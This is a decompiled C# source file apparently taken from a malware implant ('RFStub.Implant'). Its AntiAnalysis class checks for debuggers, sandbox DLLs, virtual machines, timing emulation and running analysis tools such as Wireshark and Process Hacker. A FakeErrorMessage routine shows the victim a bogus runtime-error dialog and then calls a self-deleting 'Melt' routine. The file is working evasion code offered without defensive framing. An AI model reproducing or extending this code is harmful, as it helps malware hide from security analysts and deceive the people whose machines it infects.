using System;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace RFStub.Implant;

internal sealed class AntiAnalysis
{
	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	private static bool Debugger()
	{
		bool isDebuggerPresent = false;
		try
		{
			CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
			return isDebuggerPresent;
		}
		catch
		{
		}
		return isDebuggerPresent;
	}

	private static bool Emulator()
	{
		try
		{
			long ticks = DateTime.Now.Ticks;
			Thread.Sleep(10);
			if (DateTime.Now.Ticks - ticks < 10L)
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool Hosting()
	{
		return false;
	}

	private static bool Processes()
	{
		Process[] processes = Process.GetProcesses();
		string[] source = new string[8] { "processhacker", "netstat", "netmon", "tcpview", "wireshark", "filemon", "regmon", "cain" };
		Process[] array = processes;
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				Process process = array[num];
				if (source.Contains(process.ProcessName.ToLower()))
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	private static bool SandBox()
	{
		string[] array = new string[5] { "SbieDll.dll", "SxIn.dll", "Sf2.dll", "snxhk.dll", "cmdvrt32.dll" };
		string[] array2 = array;
		int num = 0;
		while (true)
		{
			if (num < array2.Length)
			{
				string lpModuleName = array2[num];
				if (GetModuleHandle(lpModuleName).ToInt32() != 0)
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	private static bool VirtualBox()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_00f5: Unknown result type (might be due to invalid IL or missing references)
		ManagementObjectSearcher val = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
		try
		{
			ManagementObjectCollection val2 = val.Get();
			try
			{
				ManagementObjectEnumerator enumerator = val2.GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.get_Current();
						if ((current.get_Item("Manufacturer").ToString()!.ToLower() == "microsoft corporation" && current.get_Item("Model").ToString()!.ToUpperInvariant().Contains("VIRTUAL")) || current.get_Item("Manufacturer").ToString()!.ToLower().Contains("vmware") || current.get_Item("Model").ToString() == "VirtualBox")
						{
							return true;
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		catch
		{
			return true;
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		ManagementObjectEnumerator enumerator2 = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get().GetEnumerator();
		try
		{
			while (enumerator2.MoveNext())
			{
				ManagementBaseObject current2 = enumerator2.get_Current();
				if (current2.GetPropertyValue("Name").ToString()!.Contains("VMware") && current2.GetPropertyValue("Name").ToString()!.Contains("VBox"))
				{
					return true;
				}
			}
		}
		finally
		{
			((IDisposable)enumerator2)?.Dispose();
		}
		return false;
	}

	public static bool Run()
	{
		if (Config.AntiAnalysis == "1")
		{
			if (Hosting())
			{
				return true;
			}
			if (Processes())
			{
				return true;
			}
			if (VirtualBox())
			{
				return true;
			}
			if (SandBox())
			{
				return true;
			}
			if (Emulator())
			{
				return true;
			}
			if (Debugger())
			{
				return true;
			}
		}
		return false;
	}

	public static void FakeErrorMessage()
	{
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		string text = StringsCrypt.GenerateRandomData("1");
		text = "0x" + text.Substring(0, 5);
		MessageBox.Show("Exit code " + text, "Runtime error", (MessageBoxButtons)5, (MessageBoxIcon)16);
		SelfDestruct.Melt();
	}
}
